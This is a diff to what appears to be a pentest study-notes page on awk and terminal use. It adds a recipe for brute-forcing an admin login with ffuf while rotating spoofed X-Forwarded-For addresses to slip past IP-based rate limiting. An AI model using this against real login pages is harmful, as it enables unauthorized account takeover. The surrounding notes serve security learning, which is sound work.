@@ -67,7 +67,7 @@ Write to a separate output file so you retain the original evidence.
 
 ## Notebook recipes
 
-2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -95,6 +95,32 @@ cmd &>/dev/null                # discard everything
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 4. Reading & filtering output (the pentest workhorses)](/cheatsheets/terminal-tmux-zsh-cheatsheet#4-reading-&-filtering-output-the-pentest-workhorses)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Bypassing Weak IP Rate Limiting via Spoofed Headers">
+
+### Bypassing Weak IP Rate Limiting via Spoofed Headers
+
+**Login Brute Forcing**
+
+```bash
+# Generate one spoofed IP per password line, then step through both wordlists in lockstep
+awk '{printf "10.%d.%d.%d\n", int(NR/65025)%255, int(NR/255)%255, NR%254+1}' pass.txt > ips.txt
+
+ffuf -mode pitchfork -w pass.txt:PASS -w ips.txt:CLIENT_IP \
+  -u http://TARGET_IP/login.php -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Forwarded-For: CLIENT_IP' \
+  -d 'username=admin&password=PASS' -fr 'Invalid'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Login Brute Forcing — Bypassing Weak IP Rate Limiting via Spoofed Headers](/web/login-brute-forcing#bypassing-weak-ip-rate-limiting-via-spoofed-headers)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -130,6 +156,8 @@ awk 'tolower($0) ~ /error/ {print NR ":" $0}' LOG.txt
 - [Official documentation 1](https://www.gnu.org/software/gawk/manual/gawk.html)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
